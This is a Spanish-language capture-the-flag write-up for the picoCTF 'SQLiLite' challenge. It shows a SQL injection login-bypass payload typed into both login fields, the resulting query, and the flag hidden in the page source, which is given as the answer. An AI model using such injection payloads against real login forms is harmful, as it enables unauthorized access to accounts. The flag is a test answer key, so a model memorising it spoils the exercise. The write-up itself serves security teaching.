# SQLiLite


## Description

Can you login to this website? Try to login [here](http://saturn.picoctf.net:55014/).

---
## Hints 1

* `admin` is the user you want to login as.

## Solución

Entramos al sitio web proporcionado, una vez así nos pedira un username y una password, entonces ingresaremos lo siguiente:
`' or 1 or '` 
Y para la contraseña copiamos el mismo:
`' or 1 or '` 

Le damos en login y nos manda a la siguiente página:
![[Pasted image 20250403212117.png]]

Después damos clic derecho y en **ver código fuente** y nos muestra el siguiente código en el cual nos muestra nuestra flag:
```
<pre>username: &#039; or 1 or &#039; password: &#039; or 1 or &#039; SQL query: SELECT * FROM users WHERE name=&#039;&#039; or 1 or &#039;&#039; AND password=&#039;&#039; or 1 or &#039;&#039; </pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>
```
### Respuesta: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}